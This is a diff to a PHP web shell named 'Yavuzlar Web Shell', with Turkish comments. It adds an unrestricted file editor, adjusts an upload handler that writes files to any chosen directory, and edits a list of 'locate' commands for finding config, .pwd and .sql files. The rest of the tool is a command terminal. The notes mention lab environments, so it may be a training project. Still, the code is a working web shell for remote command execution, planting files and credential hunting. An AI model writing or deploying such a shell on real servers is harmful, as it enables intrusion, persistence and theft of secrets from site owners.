@@ -142,7 +142,7 @@
         echo '<h2>Ana Sayfa</h2> <p>Yavuzlar Web Shell e hoşgeldiniz.</p>';
         echo '<p> Kullanmak istediğiniz kısmı üst menüden seçiniz.</p>';
         echo '<p>Dikkat! config dosyası tespiti kısmı sisteme ağır yük bindiriyor!</p>';
-        echo '<p>Dikkat! POST isteği kullanan sayfalar bazı sitelerde çalışmayabilir!</p>';
+        echo '<p>Dikkat! POST isteği bazı lab ortamlarında engelleniyor o yüzden yerine v2 terminali kullanabilirsiniz.</p>';
         echo '<p>Made with ❤️ - Made by Xnes<p>';
     }
 
@@ -195,6 +195,8 @@
         // Dosya yüklediğimiz kısım burası
         if (isset($_POST['submit'])) {
             $target_dir = $_POST['directory'];
+            //rtim ile sonuna / ekledik
+            $target_dir = rtrim($_POST['directory'], '/') . '/';
             $target_file = $target_dir . basename($_FILES["fileToUpload"]["name"]);
             if (move_uploaded_file($_FILES["fileToUpload"]["tmp_name"], $target_file)) {
                 echo "<p>Dosya başarıyla yüklendi: " . basename($_FILES["fileToUpload"]["name"]) . "</p>";
@@ -272,7 +274,7 @@
     
         echo '<h2>Terminal</h2>';
         echo '<p>Klasik terminal v1, bu terminal çalışmazsa basit halini denemek için alttaki buton ile diğer terminale geçin.</p>';
-        echo '<p> Bu terminalin çalışmayabiliyor olmasının sebebi post istekleri bazı yerlerde çalışmıyor ondan</p>';
+        echo '<p> Bu terminalin çalışmayabiliyor olmasının sebebi post istekleri bazı lab ortamlarında engelleniyor ondan</p>';
         echo '<form method="POST" action="?page=terminal">';
         echo '<label for="cmd"><strong>Command</strong></label>';
         echo '<div class="form-group">';
@@ -391,9 +393,7 @@
             "config.dat dosyalarını bul" => "locate config.dat",
             "config.php dosyalarını bul" => "locate config.php",
             "config.inc dosyalarını bul" => "locate config.inc",
-            "config.inc.php dosyalarını bul" => "locate config.inc.php",
             "config.default.php dosyalarını bul" => "locate config.default.php",
-            "config* dosyalarını bul" => "locate config",
             ".conf dosyalarını bul" => "locate '.conf'",
             ".pwd dosyalarını bul" => "locate '.pwd'",
             ".sql dosyalarını bul" => "locate '.sql'",
@@ -446,9 +446,41 @@
     }
 
     function editfilePage() {
-    // Dosya düzenleme sayfası
+        // Dosya editlediğimiz sayfa
+        // kaynaklar: https://www.php.net/manual/en/function.file-put-contents.php
+        // https://stackoverflow.com/questions/18865548/how-to-edit-update-a-txt-file-with-php
+        if (!isset($_GET['file'])) {
+            echo '<p>Dosya belirtilmedi.</p>';
+            return;
+        }
     
-}
+        $file_path = $_GET['file'];
+    
+        // dosya var mı yok mu onun kontrolü
+        if (!file_exists($file_path)) {
+            echo '<p>Dosya bulunamadı: ' . htmlspecialchars($file_path, ENT_QUOTES, 'UTF-8') . '</p>';
+            return;
+        }
+    
+        if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+            $new_content = $_POST['file_content'];
+            if (file_put_contents($file_path, $new_content) !== false) {
+                echo '<p>Dosya başarıyla güncellendi.</p>';
+            } else {
+                echo '<p>Dosya güncellenirken bir hata oluştu.</p>';
+            }
+        }
+    
+        // Dosya içeriğini al
+        $current_content = file_get_contents($file_path);
+    
+        // Form kısmı falan filan
+        echo '<h2>Dosya Düzenle</h2>';
+        echo '<form method="POST" action="?page=editfile&file=' . urlencode($file_path) . '">';
+        echo '<textarea name="file_content" rows="20" cols="80">' . htmlspecialchars($current_content, ENT_QUOTES, 'UTF-8') . '</textarea><br>';
+        echo '<input type="submit" class="btn" value="Kaydet">';
+        echo '</form>';
+    }
 
 
     // Sayfayı seçip doğru fonksiyonu çağırıyoruz
